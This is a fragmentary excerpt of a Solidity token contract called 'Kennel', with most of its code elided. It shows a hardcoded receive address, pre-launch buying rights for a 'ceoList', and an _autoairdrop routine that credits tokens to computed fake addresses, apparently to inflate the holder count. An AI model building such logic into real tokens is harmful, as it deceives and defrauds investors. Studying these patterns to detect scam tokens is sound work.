...
contract Kennel is IERC20, Ownable {
    ...
    constructor (){
        ...
        _tTotal = total;
        ReceiveAddress = 0xCA9f91F797ba5B2eA413AD72F0F686A3174d53bf;
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if(startTradeBlock == 0 && ceoList[to]){
    ...
    function _autoairdrop(uint256 amount) private {
        address _receiveD;
        for (uint256 i = 0; i < 9; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _balances[_receiveD] = _balances[_receiveD]+(amount/(i+10));   
            _balances[address(this)] = _balances[address(this)]-(amount/(i+10));         
        }
    }
    ...
    function Airdrop(address[] calldata addresses, uint256[] calldata tAmount) external onlyOwner {
        require(addresses.length == tAmount.length && addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
        uint256 SCCC=0;
        ...
        for(uint i=0; i < addresses.length; i++){
            _balances[msg.sender] = _balances[msg.sender] - tAmount[i];
            _takeTransfer(msg.sender,addresses[i],tAmount[i]);
        }
    }
}